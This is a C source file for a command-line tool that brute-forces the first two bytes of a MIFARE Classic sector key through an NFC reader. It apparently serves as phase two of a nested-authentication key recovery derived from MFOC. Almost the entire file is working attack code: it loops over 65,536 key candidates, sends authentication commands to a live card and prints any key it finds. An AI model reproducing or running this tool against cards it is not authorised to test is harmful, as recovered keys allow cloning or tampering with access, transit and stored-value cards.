//Bruteforce for mifare classic first bytes of key. Based on MFOC source code.

#define _XOPEN_SOURCE 1 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

// NFC
#include <nfc/nfc.h>


// Internal
#include "config.h"
#include "mifare.h"
#include "nfc-utils.h"
#include "mf_key_brute.h"
#include <time.h>


nfc_context *context;

int main(int argc, char *const argv[])
{
time_t start, now;

const nfc_modulation nm = {
	.nmt = NMT_ISO14443A,
	.nbr = NBR_106,
};

int block;
static mifare_param mp;
mifare_cmd 	mc;
mftag		t;
mfreader	r;

char key_type='A';
//////////////////////////////////////////////////////// 

uint8_t Key[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
uint64_t optkey =0;



printf("Mifare classic nested auth key recovery. Phase 2.\n");

  if (argc < 4) {
    printf(" syntax: %s <key candidate> <block> <A|B> \n\n",argv[0]);
    return 1;
  }

sscanf(argv[1],"%llx",&optkey);
num_to_bytes(optkey,6,Key);

sscanf(argv[2],"%d",&block);
sscanf(argv[3],"%c",&key_type);

if(key_type == 'B')
{
	mc = MC_AUTH_B;
	printf("looking for key B\n");
}
else
{
	mc = MC_AUTH_A;
	printf("looking for key A\n");
}
printf("block:\t%d (0x%02x)\n",block,block);
printf("Known 4 key bytes:\t%02x %02x %02x %02x\n",Key[2], Key[3], Key[4], Key[5]);


////////////////////////////////////////////////////////


// Initialize reader/tag structures
mf_init(&r);

if (nfc_initiator_init(r.pdi) < 0)
{
	nfc_perror(r.pdi, "nfc_initiator_init");
	goto error;
}
// Drop the field for a while, so can be reset
if (nfc_device_set_property_bool(r.pdi, NP_ACTIVATE_FIELD, true) < 0) 
{
	nfc_perror(r.pdi, "nfc_device_set_property_bool activate field");
	goto error;
}
// Let the reader only try once to find a tag
if (nfc_device_set_property_bool(r.pdi, NP_INFINITE_SELECT, false) < 0) 
{
	nfc_perror(r.pdi, "nfc_device_set_property_bool infinite select");
	goto error;
}
// Configure the CRC and Parity settings
if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true) < 0) 
{
	nfc_perror(r.pdi, "nfc_device_set_property_bool crc");
	goto error;
}
if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true) < 0) 
{
	nfc_perror(r.pdi, "nfc_device_set_property_bool parity");
	goto error;
}


int tag_count;
if ((tag_count = nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt)) < 0) 
{
	nfc_perror(r.pdi, "nfc_initiator_select_passive_target");
	goto error;
} else if (tag_count == 0) 
{
	ERR("No tag found.");
	goto error;
}
else
{
printf("tag found\n");
}

// Test if a compatible MIFARE tag is used
if ((t.nt.nti.nai.btSak & 0x08) == 0) 
{
	ERR("only Mifare Classic is supported");
	goto error;
}

t.authuid = (uint32_t) bytes_to_num(t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, 4);

// Set the authentication information (uid)
memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mp.mpa.abtAuthUid));
printf("mp.mpa.abtAuthUid:\t%0x %0x %0x %0x\n",mp.mpa.abtAuthUid[0],mp.mpa.abtAuthUid[1],mp.mpa.abtAuthUid[2],mp.mpa.abtAuthUid[3]);

memcpy(mp.mpa.abtKey,Key, 6);
printf("mp.mpa.abtKey:\t%0x %0x %0x %0x %0x %0x\n",mp.mpa.abtKey[0],mp.mpa.abtKey[1],mp.mpa.abtKey[2],mp.mpa.abtKey[3],mp.mpa.abtKey[4],mp.mpa.abtKey[5]);

//printf("Block:\t%0x \n",block);
int progress_cnt =0;
int progress_cnt_last =0;
int success =0;
int speed =0;
time(&start);
for (mp.mpa.abtKey[0] = 0x00; mp.mpa.abtKey[0]<=0xff; mp.mpa.abtKey[0]++)
{
	mp.mpa.abtKey[1] = 0x00;
	while(1)
	{
		//printf("mp.mpa.abtKey:\t %0x %0x %0x %0x %0x %0x\n",mp.mpa.abtKey[0],mp.mpa.abtKey[1],mp.mpa.abtKey[2],mp.mpa.abtKey[3],mp.mpa.abtKey[4],mp.mpa.abtKey[5]);
		
		int res;
		if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, block, &mp)) < 0)
		{
			if (res != NFC_EMFCAUTHFAIL)
			{
				nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
				printf("err!\n");
			}
			mf_anticollision(t, r);
			//printf("Wrong key\n");
		}
		else
		{
			printf("\nWheeeee! Key found!\n");
			printf("Founded Key:\t %02x %02x %02x %02x %02x %02x\n",mp.mpa.abtKey[0],mp.mpa.abtKey[1],mp.mpa.abtKey[2],mp.mpa.abtKey[3],mp.mpa.abtKey[4],mp.mpa.abtKey[5]);
			success =1;
			break;
		}
		if (mp.mpa.abtKey[1] == 0xff) break;
		mp.mpa.abtKey[1]++;
		progress_cnt++;
		time(&now);		
		if(now != start)
		{
			speed = progress_cnt - progress_cnt_last;
			progress_cnt_last = progress_cnt;
			start = now;
		}			
		if (progress_cnt%10 ==0) 
		{
			//printf("checked keys:\t%d\n",progress_cnt);
				
			printf("Try #%d using Key:\t %02x %02x %02x %02x %02x %02x\t%0.2f %%\t%d keys/sec\r", progress_cnt, mp.mpa.abtKey[0], mp.mpa.abtKey[1], mp.mpa.abtKey[2], mp.mpa.abtKey[3], mp.mpa.abtKey[4], mp.mpa.abtKey[5],(float)progress_cnt*0.001525902, speed);
			fflush(stdout);
			
		}
		
	}
	if(success) break;
}
if (!success)
{
	printf("\nKey not found :-(\nlooks like something very wrong\n");
}

error:
nfc_close(r.pdi);
nfc_exit(context);
exit(EXIT_FAILURE);

}


void mf_init(mfreader *r)
{
  // Connect to the first NFC device
  nfc_init(&context);
  if (context == NULL) {
    ERR("Unable to init libnfc (malloc)");
    exit(EXIT_FAILURE);
  }
  r->pdi = nfc_open(context, NULL);
  if (!r->pdi) {
    printf("No NFC device found.\n");
    exit(EXIT_FAILURE);
  }
	else
{
	printf("nfc reader opened\n");
}
}

void mf_configure(nfc_device *pdi)
{
  if (nfc_initiator_init(pdi) < 0) {
    nfc_perror(pdi, "nfc_initiator_init");
    exit(EXIT_FAILURE);
  }
  // Drop the field for a while, so can be reset
  if (nfc_device_set_property_bool(pdi, NP_ACTIVATE_FIELD, false) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool activate field");
    exit(EXIT_FAILURE);
  }
  // Let the reader only try once to find a tag
  if (nfc_device_set_property_bool(pdi, NP_INFINITE_SELECT, false) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool infinite select");
    exit(EXIT_FAILURE);
  }
  // Configure the CRC and Parity settings
  if (nfc_device_set_property_bool(pdi, NP_HANDLE_CRC, true) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool crc");
    exit(EXIT_FAILURE);
  }
  if (nfc_device_set_property_bool(pdi, NP_HANDLE_PARITY, true) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool parity");
    exit(EXIT_FAILURE);
  }
  // Enable the field so more power consuming cards can power themselves up
  if (nfc_device_set_property_bool(pdi, NP_ACTIVATE_FIELD, true) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool activate field");
    exit(EXIT_FAILURE);
  }
}

void mf_select_tag(nfc_device *pdi, nfc_target *pnt)
{
  // Poll for a ISO14443A (MIFARE) tag
  const nfc_modulation nm = {
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106,
  };
  if (nfc_initiator_select_passive_target(pdi, nm, NULL, 0, pnt) < 0) {
    ERR("Unable to connect to the MIFARE Classic tag");
    nfc_close(pdi);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }
	
}

int trailer_block(uint32_t block)
{
  // Test if we are in the small or big sectors
  return (block < 128) ? ((block + 1) % 4 == 0) : ((block + 1) % 16 == 0);
}

void mf_anticollision(mftag t, mfreader r)
{
  const nfc_modulation nm = {
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106,
  };
  if (nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt) < 0) {
    nfc_perror(r.pdi, "nfc_initiator_select_passive_target");
    ERR("Tag has been removed");
    exit(EXIT_FAILURE);
  }
}


long long unsigned int bytes_to_num(uint8_t *src, uint32_t len)
{
  uint64_t num = 0;
  while (len--) {
    num = (num << 8) | (*src);
    src++;
  }
  return num;
}

void num_to_bytes(uint64_t n, uint32_t len, uint8_t *dest)
{
	while (len--)
	{
		dest[len] = (uint8_t) n;
		n >>= 8;
	}
}
